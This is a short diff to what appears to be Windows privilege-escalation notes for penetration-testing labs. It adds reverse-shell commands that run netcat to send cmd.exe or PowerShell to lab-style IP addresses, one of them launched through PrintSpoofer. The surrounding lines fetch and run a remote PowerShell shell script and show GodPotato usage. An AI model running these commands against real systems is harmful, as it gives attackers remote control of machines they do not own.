@@ -31,6 +31,8 @@ Get a proper shell first if you're on a raw reverse shell:
 
 ```powershell
 # Upgrade netcat shell -> add a stable listener via nc.exe, or pivot to evil-winrm if creds found later
+.\nc.exe -e cmd.exe 10.10.14.57 4443
+
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')"
 ```
 
@@ -78,6 +80,8 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
 # PrintSpoofer (best first try)
 .\PrintSpoofer64.exe -i -c cmd
+
+.\PrintSpoofer64.exe -c "nc64.exe 192.168.45.204 4444 -e powershell"
 
 # GodPotato (works on newer builds where PrintSpoofer fails)
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"
